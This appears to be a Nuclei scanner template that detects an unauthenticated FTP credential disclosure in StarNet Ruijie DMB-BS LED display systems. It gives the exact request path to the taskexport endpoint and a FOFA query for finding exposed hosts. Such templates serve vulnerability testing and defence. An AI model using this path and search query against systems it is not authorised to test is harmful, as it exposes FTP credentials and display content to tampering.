http:
- matchers:
  - condition: and
    dsl:
    - contains(content_type, 'text/xml')
    - contains_all(body, 'user=','tasks version')
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{RootURL}}/dmb/out/taskexport.jsp?taskcode'
id: starnet-dmb-bs-ftp-credentials-disclosure
info:
  author: brucelsone
  description: 'The StarNet Ruijie DMB-BS LED Display System contains a security vulnerability
    in its taskexport interface that allows unauthorized access to FTP server credentials
    and connection parameters. This exposure enables potential attackers to gain unauthorized
    access to the FTP server, potentially compromising the integrity and content of
    the LED display system.

    '
  metadata:
    fofa-query: "(app=\"STAR_NET-\u6570\u5B57\u6807\u724C\u7CFB\u7EDF\" || -\u6B22\
      \u8FCE! -- BS3.2.02.38447- || icon_hash=\"-260118452\")"
    max-request: 1
    verified: true
  name: StarNet DMB-BS - FTP Credentials Disclosure
  reference:
  - https://www.ddpoc.com/DVB-2024-7055.html
  - https://blog.csdn.net/shelter1234567/article/details/145521914
  severity: medium
  tags: starnet,ruijie,ftp,password,exposures,vuln
